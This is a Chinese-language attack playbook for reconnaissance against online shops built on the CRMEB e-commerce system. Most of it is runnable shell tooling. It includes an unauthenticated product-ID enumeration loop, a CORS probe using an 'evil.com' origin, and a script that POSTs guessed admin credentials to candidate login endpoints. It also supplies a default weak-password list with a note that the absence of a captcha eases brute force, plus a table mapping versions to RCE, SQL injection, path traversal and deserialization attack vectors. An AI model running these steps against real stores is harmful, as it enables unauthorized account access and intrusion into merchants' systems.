# CRMEB E-commerce System Reconnaissance

> 适用目标：基于 CRMEB（开源新零售社交电商系统）搭建的商城
> 触发特征：meta keywords 含 "CRMEB"、Nuxt.js SSR + PHPSESSID cookie、Cloudflare 防护

## 1. 技术栈特征

| 层 | 技术 | 识别信号 |
|----|------|---------|
| 前端 | Nuxt.js SSR (Vue) | `<div id="__nuxt">`、`window.__NUXT__`、chunk 文件带 hash |
| 后端 | ThinkPHP (PHP) | `PHPSESSID` cookie、JSON 响应 `{"status":...,"msg":...,"data":...}` |
| CDN | Cloudflare | `Server: cloudflare`、`CF-RAY` header、JS Challenge |

CRMEB 的 API 响应统一格式：
```json
{"status": 200, "msg": "success", "data": {...}}   // 成功
{"status": 401, "msg": "请登录"}                      // 未认证
{"status": 400, "msg": "商品不存在"}                  // 业务错误
```

## 2. 关键陷阱：Nuxt fallback vs 真实 JSON API

CRMEB 是 **Nuxt.js + PHP 混合架构**——所有未匹配路径都被 Nuxt 接管返回 homepage HTML（HTTP 200），而非 PHP 404。

### 判断方法：
- **真实 PHP API 路径** (`/api/*`)：返回 JSON `Content-Type: application/json; charset=utf-8`
- **Nuxt fallback 路径** (`/user/api/*`, `/admin/*` 静态文件)：返回 HTML `Content-Type: text/html; charset=utf-8`，内容为主页

```bash
# 真实 API（JSON）
curl -s "${target}/api/cart/list" -H "Accept: application/json"
# → {"status":401,"msg":"请登录"}

# Nuxt fallback（HTML）
curl -s "${target}/user/api/info" -H "Accept: application/json"
# → <!doctype html>...<div id="__nuxt">...
```

**排查 API 是否存在时**：总是用 `Accept: application/json` header，检查响应 Content-Type 是否为 JSON。

## 3. 默认无需认证接口（信息泄露）

CRMEB 默认安装下全部无需登录即可访问：

| 接口 | 泄露信息 |
|------|---------|
| `/api/index` | 首页 banner、菜单、商品列表、配置 |
| `/api/category` | 全部分类树（id、名称、图片） |
| `/api/product/detail/{id}` | 商品完整信息（名称、价格、库存、销量、描述 HTML） |
| `/api/product/detail/{id}.html` | 同上（.html 也可访问） |
| `/api/seckill/index` | 秒杀时间段配置 |
| `/api/combination/list` | 拼团列表 |
| `/api/combination/index` | 拼团首页 |
| `/api/cart/list` | 返回 `{"status":401,"msg":"请登录"}`（仅确认路由存在） |
| `/api/order/list` | 同上（确认路由存在） |

### 商品 IDOR 枚举：
```bash
for i in {1..300}; do
  resp=$(curl -s "${target}/api/product/detail/$i" -H "Accept: application/json")
  name=$(echo "$resp" | python -c "import sys,json; d=json.load(sys.stdin); print(d['data']['store_name'][:40])" 2>/dev/null)
  [ -n "$name" ] && echo "ID=$i: $name"
done
```

**注意**：`/api/product/detail?id=1`（GET 参数）通常返回 400"商品不存在"，路由使用 pathinfo 模式，必须 `/api/product/detail/1`。

## 4. CORS 配置缺陷

CRMEB 默认 PHP 后端响应头：
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Authori-zation,Authorization,Content-Type,...
Access-Control-Allow-Methods: GET,POST,PATCH,PUT,DELETE,OPTIONS
```

**风险**：`Allow-Origin: *` + `Allow-Credentials: true` 组合违反浏览器安全规范（浏览器会拒绝此组合），但如果未来改为反射 Origin，将导致跨域 Cookie 窃取。

**利用**：任意域名可通过 fetch（withCredentials）跨域读取用户响应数据（需用户已登录 + 同源 XSS 配合）。

## 5. 认证机制细节

- **认证头**：`Authori-zation`（注意中间有连字符，不是 `Authorization`）
- **Cookie**：`PHPSESSID` + `server_name_session`（后者 Max-Age=86400 httponly）
- **登录入口**（前端）：`/admin/login`、`/merchant`、`/public/admin/system/login/index`

### 探测真实 admin 登录 API：
CRMEB admin 真实登录接口是 POST 请求，常见路径变体（目前观察到的可能需要运行前端 JS 逆向）：
```bash
# 尝试以下 POST 路径
paths=(
  "/api/admin/system/login"
  "/api/admin/index/login"
  "/api/system/login/login"
  "/public/admin/system/login/index"
  "/api/admin/login"
)
for p in "${paths[@]}"; do
  resp=$(curl -s -X POST "${target}${p}" \
    -H "Content-Type: application/json" \
    -H "Accept: application/json" \
    -d '{"account":"admin","pwd":"test123"}')
  # 检查是否为 JSON（非 HTML）
  echo "$resp" | python -c "import sys,json;json.loads(sys.stdin.read());print('JSON: $p')" 2>/dev/null
done
```

## 6. 管理后台常见入口

| 路径 | 用途 | 默认状态 |
|------|------|---------|
| `/admin/login` | 管理后台（Vue SPA） | 200，对外暴露 |
| `/merchant` | 商户端登录 | 200，对外暴露 |
| `/public/admin/*` | 后台静态文件/Nuxt 混合 | Nuxt fallback |
| `/admin/system_static/js/app.*.js` | 后台 JS chunk | Nuxt fallback (⚠️ 不是真实 admin JS) |
| `/install` | 安装页面 | 301 重定向 |
| `/update` | 更新页面 | 200（实际是主页 fallback） |

**防护建议**：管理后台路径应在 CDN/WAF 层做 IP 白名单或二次认证。

## 7. 弱口令常见组合

CRMEB 默认安装常见凭证：
```
admin / admin
admin / 123456
admin / admin888
admin / admin123
admin / admin@123
admin / 12345678
crmeb / crmeb
```

注意：CRMEB 无登录验证码（默认安装），易受暴力破解。

## 8. 快速侦察流程（checklist）

```
1. 识别 CRMEB：
   curl -s $target/ | grep -o 'CRMEB' | head -1
   curl -s $target/ | grep -o 'PHPSESSID' | head -1

2. 探测 CORS：
   curl -s $target/api/cart/list -H "Origin: https://evil.com" -D - | grep -i 'access-control'

3. 枚举商品（信息泄露验证）：
   curl -s $target/api/product/detail/8 -H "Accept: application/json" | python -m json.tool

4. 探测 admin API（找真实登录接口）：
   遍历上述 paths 列表，找非 HTML 响应

5. 通用 API 枚举：
   for p in /api/index /api/category /api/seckill/index /api/combination/list /api/product/detail/1; do
     curl -s $target$p -H "Accept: application/json" | head -c 100
   done

6. 检查后台暴露路径：
   for p in /admin/login /merchant /public/admin /install; do
     curl -s -o /dev/null -w "$p: %{http_code}\n" $target$p
   done
```

## 9. CRMEB 已知漏洞清单（快速参考）

| 漏洞 | 影响版本 | 利用方式 |
|------|---------|---------|
| v3.2.8 后台 RCE | CRMEB v3.x | 后台文件上传 → webshell |
| v4.0 - v4.6 前台 RCE | CRMEB v4.x | `/api/file/open` SSRF/RCE |
| SQL注入 (多处) | v3.x-v4.x | 商品筛选、搜索参数 |
| 任意文件读取 | v3.x-v4.x | `/api/download` 路径穿越 |
| 反序列化 | v4.x | `/api/combination/read` |

> 参考：exploit-db、CNVD、Seebug
